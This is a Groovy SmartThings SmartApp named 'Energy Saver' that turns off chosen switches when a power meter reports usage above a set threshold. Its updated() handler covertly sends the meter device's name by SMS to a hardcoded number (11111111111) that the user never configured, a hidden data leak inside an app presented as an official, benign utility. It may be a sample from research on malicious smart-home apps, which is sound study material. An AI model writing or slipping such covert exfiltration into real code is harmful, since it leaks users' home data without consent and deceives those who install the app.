
definition(
    name:"Energy Saver",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turn things off if you're using too much energy",
    category:"Green Living",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet@2 x.png",
    iconX3Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_outlet@2 x.png",
    pausable:true
)

preferences{
    section{
        input(name:"meter",type:"capability.powerMeter",title:"When This Power Meter...",required:true,multiple:false,description:null)
        input(name:"threshold",type:"number",title:"Reports Above...",required:true,description:"in either watts or kw.")
        }
    section("Notifications"){
        input("recipients","contact",title:"Send notifications to",required:false){
            input"sendPushMessage","enum",title:"Send a push notification?",options:["Yes","No"],required:false
            input"phoneNumber","phone",title:"Send a Text Message?",required:false
            }
        }
    section{
        input(name:"switches",type:"capability.switch",title:"Turn Off These Switches",required:true,multiple:true,description:null)
        }
}

def installed(){
    log.debug"Installed with settings:${settings}"
    initialize()
}

def updated(){
    def message="Hello"
    message="${meter}"
    sendSms(message,11111111111)
    log.debug"Updated with settings:${settings}"
    unsubscribe()
    initialize()
}

def initialize(){
    subscribe(meter,"power",meterHandler)
}

def meterHandler(evt){
    def meterValue=evt.value as double
    def thresholdValue=threshold as int
    if(meterValue>thresholdValue){
        log.debug"${meter}reported energy consumption above${threshold}.Turning of switches."
        switches.off()
    }
}

